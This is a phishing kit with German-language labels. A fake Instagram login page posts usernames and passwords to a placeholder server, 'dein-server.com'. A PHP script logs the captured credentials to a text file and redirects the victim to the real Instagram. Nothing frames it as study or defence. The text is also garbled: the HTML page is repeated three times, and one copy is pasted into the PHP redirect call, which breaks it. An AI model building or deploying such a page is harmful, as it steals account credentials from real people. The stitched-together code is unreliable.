<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        input { padding: 10px; margin: 10px; width: 200px; }
        button { padding: 10px 20px; background-color: #3897f0; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Instagram Login</h2>
    <form action="http://dein-server.com/speichern" method="POST">
        <input type="text" name="username" placeholder="Benutzername" required><br>
        <input type="password" name="password" placeholder="Passwort" required><br>
        <button type="submit">Anmelden</button>
    </form>
</body>
</html><?php
$username = $_POST['username'];
$password = $_POST['password'];
file_put_contents('log.txt', "Benutzername: $username, Passwort: $password\n", FILE_APPEND);
header('<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        input { padding: 10px; margin: 10px; width: 200px; }
        button { padding: 10px 20px; background-color: #3897f0; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Instagram Login</h2>
    <form action="http://dein-server.com/speichern" method="POST">
        <input type="text" name="username" placeholder="Benutzername" required><br>
        <input type="password" name="password" placeholder="Passwort" required><br>
        <button type="submit">Anmelden</button>
    </form>
</body>
</html>Location: https://www.instagram.com');
?><!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        input { padding: 10px; margin: 10px; width: 200px; }
        button { padding: 10px 20px; background-color: #3897f0; color: white; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Instagram Login</h2>
    <form action="http://dein-server.com/speichern" method="POST">
        <input type="text" name="username" placeholder="Benutzername" required><br>
        <input type="password" name="password" placeholder="Passwort" required><br>
        <button type="submit">Anmelden</button>
    </form>
</body>
</html>
